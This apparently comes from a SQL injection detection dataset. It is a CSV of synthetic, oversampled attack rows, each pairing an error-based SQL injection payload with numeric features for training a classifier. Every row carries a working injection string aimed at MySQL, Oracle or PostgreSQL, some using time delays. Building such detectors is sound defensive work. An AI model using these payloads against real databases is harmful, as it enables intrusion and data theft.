id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000172,attack,error,"1' or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'scye' like 'scye",nearest_attack_euclidean,R000042,1.0435482810418781,270.5740458398204,36.78587786498878,4.036237788880412,108.85877864988777,35.0,94.35763359496633,32.35763359496633,0.4021895866837716,0.1294334351214605,0.3488295316335347,0.11954744656123324,3.1435114599551044,0.0,0.0,0.0,2.0,1.0,0.0,18.0,0.0,2.0,5.0,3.0,0.7858778649887762,0.0,0.0,0.21412213501122376,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,1.0,0.7858778649887762,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,9.785877864988777
SMOTE_000173,attack,error,1' in boolean mode  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  #,nearest_attack_euclidean,R000215,0.7205379683558883,400.331985991971,35.376423035010745,3.5124690432558836,107.97208933843717,50.58428202334049,175.47778147848015,66.2978331517132,0.2690955568514594,0.1272346408621478,0.43795441783038086,0.16571538445601192,0.7921410116702473,0.0,0.0,0.0,0.0,2.0,0.0,37.12926910503223,0.0,0.0,0.20785898832975258,26.752846070021484,0.7921410116702474,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.7921410116702472,0.0,0.0,1.7921410116702474,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,6.584282023340495
SMOTE_000174,attack,error,"1""   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  ""djrh""  =  ""djrh",nearest_attack_euclidean,R000300,0.00798724851270421,377.90521875353755,33.00653663768706,3.4760939506609043,99.97385344925173,45.01307327537413,167.93463362312934,64.98365840578234,0.26454719249604614,0.11911740918256418,0.44437785023687165,0.171957548084518,0.0,4.0,0.0,0.0,0.0,3.0,0.0,33.98692672462587,0.0,2.990195043469401,0.003268318843532736,23.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,6.0
SMOTE_000175,attack,error,"1'||  (  select 'xasp' from dual where 4025  =  4025 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R000173,1.3964904927696395,216.52322968129124,32.9767399483175,3.7704370950797665,62.953479896634995,37.30231993109,86.29068990524875,29.9767399483175,0.29051333942146335,0.17197284563700782,0.3992330175806439,0.1382807973608849,4.0,0.0,0.0,0.0,1.0,2.0,0.0,15.3255799827725,0.0,0.0,4.0,5.651159965544999,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.6627899913862498,3.66278999138625,0.0,0.6627899913862498,1.6627899913862498,1.3372100086137502,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,8.3255799827725
SMOTE_000176,attack,error,"1""   )    )    as uzvu where 2458  =  2458 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R000077,1.4047786132744775,291.1375439890362,41.364310850877814,4.064896009963377,107.40892228728055,43.0,106.54646627631672,34.18215542543891,0.3690002837900117,0.14771724393172916,0.36589713895129267,0.11738533332696642,0.0,0.5910777127194538,2.0,0.0,2.0,2.0,0.0,19.591077712719454,0.0,2.0,5.0,6.0,0.0,0.5910777127194538,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,1.0,2.0,0.40892228728054614,0.5910777127194538,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000177,attack,error,"-9987   )    )     )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  2114  =  2114",nearest_attack_euclidean,R000161,0.21596350297835473,381.6018905569997,36.06635157383338,3.4030515704800424,83.53081259066704,59.46918740933296,175.46918740933296,63.13270314766676,0.21891927629918007,0.15582263114727365,0.45980907355138995,0.16544901900215636,0.2654062953335192,0.0,1.0,0.0,0.0,3.0,0.0,35.86729685233324,0.0,0.0,1.0,24.0,0.06635157383337986,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,6.0
SMOTE_000178,attack,error,"1  )   where 1559  =  1559 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",nearest_attack_euclidean,R000162,0.12499525539026914,165.0,29.85766424916956,3.8021721028619373,38.427007252491315,46.43065699667824,59.284671501660874,20.85766424916956,0.23289095304540194,0.28139792119198936,0.3593010394040054,0.12641008635860337,0.0,0.0,2.0,0.0,0.0,2.0,0.0,11.0,0.0,0.0,5.857664249169559,4.0,0.0,0.0,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,4.0
SMOTE_000179,attack,error,"1' where 8860  =  8860 and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )   --",nearest_attack_euclidean,R000240,0.7343526327001054,162.0,30.22994843889841,3.85835684923362,41.310154683304766,43.919793755593645,56.54010312220317,20.22994843889841,0.25500095483521457,0.27110983799749167,0.3490129822358221,0.12487622493147167,0.7700515611015881,0.22994843889841177,2.0,0.0,0.0,2.0,0.0,10.0,0.0,0.0,5.229948438898412,4.0,0.7700515611015881,0.22994843889841177,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,4.0
SMOTE_000180,attack,error,-2951 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  # gwqv,nearest_attack_euclidean,R000293,0.05938148988136855,403.6872752840316,36.985785240183255,3.4797097277152726,103.70149004384835,54.08528855890047,177.9715704803665,67.92892620091628,0.25685504476294285,0.13399605847583124,0.4408803293861804,0.16826856737504553,0.0,0.0,1.0,0.0,0.0,2.014214759816745,0.0,37.97157048036651,0.0,0.0,0.014214759816745026,28.928926200916273,0.0,0.0,0.0,0.9857852401832549,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.985785240183255,0.0,0.0,1.985785240183255,0.014214759816744915,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,6.9857852401832545
SMOTE_000181,attack,error,-7746'   )    )     )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  'itxy' like 'itxy,nearest_attack_euclidean,R000126,0.04238515814727106,454.96758467334325,36.0,3.441286021838875,114.87033869337299,54.0,209.06483065331352,77.03241532665675,0.25247970115723595,0.11868979245601716,0.45951625478302227,0.16931425160372462,4.0,0.0,1.0,0.0,0.0,2.032415326656755,0.0,44.0,0.0,0.0,0.0,29.032415326656754,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,8.0
SMOTE_000182,attack,error,"1%'   )    )    procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R000094,1.745852647465497,171.08019663138555,33.065700240615314,3.698885158575762,54.36006554379519,23.311433253128225,70.851531568821,22.55716626564114,0.31755951026425194,0.1376063902364681,0.4128294115020583,0.13200468799722162,0.6885667468717722,1.2457330125129114,0.0,0.0,0.0,0.0,0.0,15.245733012512911,0.6885667468717722,0.0,4.0,0.0,0.6885667468717722,0.3114332531282278,0.0,0.6885667468717721,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.3114332531282278,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,2.311433253128228
SMOTE_000183,attack,error,-4610'   )    )    or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (   'hdco'  =  'hdco,nearest_attack_euclidean,R000254,0.08112380731900741,445.0375683904674,33.311270517140215,3.3912314402823034,111.0,54.0,203.8300547123739,76.20751367809348,0.24942865176736378,0.12134366842736616,0.4579906234324976,0.17123705637277248,4.0,0.0,1.0,0.0,0.0,3.0,0.0,42.20751367809348,0.0,0.0,0.0,30.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,8.0
SMOTE_000184,attack,error,1  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  9932  =  9932,nearest_attack_euclidean,R000119,0.8148620780741916,361.00268035616466,29.50134017808232,3.2715335415058933,80.00536071232928,50.994639287670715,170.0,60.002680356164646,0.22157906584750992,0.14130744875369913,0.47092143116187435,0.16619205423691663,1.0026803561646411,0.0,0.0,0.0,0.0,3.0,0.0,34.0,0.0,0.0,0.0,23.0,0.2506700890411603,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,6.0
SMOTE_000185,attack,error,-4906'   )    )     )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  'pkrq'  =  'pkrq,nearest_attack_euclidean,R000269,0.9453457062192833,373.11768875014485,37.0,3.5642475027798337,95.61169799976821,49.694151000115895,163.3883020002318,64.42353775002897,0.256332000714355,0.13315708666224152,0.43784932788081965,0.17266158474258386,4.0,0.0,1.0,0.0,0.0,3.0,0.0,32.84707550005795,0.0,1.7293867499130813,0.42353775002897276,24.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,6.0
SMOTE_000186,attack,error,"-2782'   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000222,0.2899305561704817,211.94239618255057,39.35253460581648,3.8058335078483783,63.0,37.0,87.94239618255057,24.0,0.29728581888592487,0.17459643331395588,0.41486600727214784,0.11325174052797139,1.0,0.0,1.0,0.0,1.0,1.0,0.0,15.823732697091762,0.17626730290823928,0.0,3.0,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000187,attack,error,"1%""  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000242,0.24285549092764142,163.01689509460346,27.0,3.696022902953015,37.0,39.0,61.60214890143811,25.41474619316531,0.22858422534561096,0.24094012941834667,0.3747193667697464,0.155756278466296,0.0,4.0,0.0,0.0,0.0,2.0,0.0,11.41474619316531,2.0,0.0,6.0,2.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,4.0
SMOTE_000188,attack,error,"1""   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   ""gmld"" like ""gmld",nearest_attack_euclidean,R000057,0.04558641120367634,185.4428319685011,29.0,3.6890235632119666,49.069646003937365,38.90713866141685,72.58212397637584,24.883923326771065,0.26477682829801524,0.20982534661661992,0.39124347291601363,0.13415435216935118,0.0,4.0,0.0,0.0,0.0,1.0,0.0,13.907138661416852,0.0,0.0,5.976784665354213,1.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,4.0
SMOTE_000189,attack,error,-4582   )    )    as gvfo where 8885  =  8885 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,nearest_attack_euclidean,R000221,0.3854600176395236,437.62870296800327,34.0,3.4896470145564624,109.98372984342997,62.0,193.6449731245733,72.0,0.2512913737818012,0.14169345078949955,0.4424679422537965,0.16454723317490272,0.0,0.16937835942833834,3.0,0.0,0.0,3.0,0.0,39.830621640571664,0.0,0.0,0.0,32.0,0.0,0.16937835942833837,1.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,8.0
SMOTE_000190,attack,error,"-2782'   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000222,0.15976256093811822,212.03083808472397,39.17621125732291,3.799624237453258,63.0,37.0,88.11894371338543,23.91189437133854,0.29719372473998024,0.1745423462758614,0.4154834384188784,0.11278049056527993,1.0,0.0,1.0,0.0,1.0,1.0,0.0,15.823788742677086,0.08810562866145683,0.0,3.0,3.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.0
SMOTE_000191,attack,error,"1""  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  ""mmgx"" like ""mmgx",nearest_attack_euclidean,R000099,0.13999498580878242,431.28331295168607,36.234522353691865,3.521939027028146,116.0,51.0,191.81426824430238,72.46904470738373,0.2690147571446928,0.11827372943430461,0.4446756494517949,0.1680358639692077,0.0,4.0,0.0,0.0,0.0,2.0,0.0,40.46904470738373,0.0,0.0,0.0,28.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,2.0,0.0,0.0,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,8.0
SMOTE_000192,attack,error,"1%""  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  ""%""  =  """,nearest_attack_euclidean,R000198,0.026623091359873997,163.82217216554153,27.0,3.6098675719739184,38.94665164966246,35.07113113378338,64.82217216554156,24.982217216554155,0.23773305971208913,0.2141229600944932,0.3956444030879242,0.15249957710549344,0.0,4.0,0.0,0.0,0.0,2.0,0.0,11.964434433108309,2.0,0.0,5.0177827834458455,2.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,4.0
SMOTE_000193,attack,error,"1%""   )    )     )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000139,1.2794163392642834,178.24417957331627,27.56976718293265,3.5269047931025765,38.279068731730604,36.720931268269396,75.53487802451832,27.709301548797953,0.21502699726946808,0.20782390387910848,0.4215168629146367,0.1556322359367867,0.0,4.0,0.0,0.0,0.0,2.0,0.0,14.279068731730604,2.0,0.0,5.430232817067349,2.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.5697671829326505,0.4302328170673493,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,0.0,0.0,4.0
SMOTE_000194,attack,error,"1""  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  ""imlx""  =  ""imlx",nearest_attack_euclidean,R000071,1.1015310322685066,279.19977848421837,35.872767548323935,3.991719396648012,107.56361622583803,35.0,101.50892980670424,35.127232451676065,0.3853697948181708,0.1254063838550838,0.3634313486594062,0.12579247266733917,0.0,4.0,0.0,0.0,2.0,2.0,0.0,19.12723245167606,0.0,2.0,5.0,4.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,2.0,1.563616225838031,0.4363837741619689,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000195,attack,error,1'  )   and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  'xazf'  =  'xazf,nearest_attack_euclidean,R000244,1.496644900423795,362.15839209826095,30.07919604913048,3.2940795034601797,82.31678419652192,48.68321580347807,170.0,61.15839209826096,0.22724120670851294,0.1344899489319618,0.4694221103731352,0.16884673398639002,2.158392098260964,0.0,0.0,0.0,0.0,3.0,0.0,34.0,0.0,0.0,0.0,23.0,0.539598024565241,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,-2.7755575615628914e-17,0.0,1.0,1.0,6.0
